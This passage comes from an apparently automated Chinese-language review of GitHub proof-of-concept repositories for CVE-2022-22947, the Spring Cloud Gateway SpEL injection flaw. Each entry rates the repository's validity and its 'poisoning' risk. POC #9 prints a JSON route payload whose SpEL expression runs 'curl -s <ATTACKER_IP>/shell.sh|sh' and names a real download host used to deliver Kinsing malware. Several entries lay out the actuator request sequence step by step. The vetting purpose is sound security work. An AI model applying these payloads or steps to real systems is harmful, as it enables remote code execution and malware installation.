3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

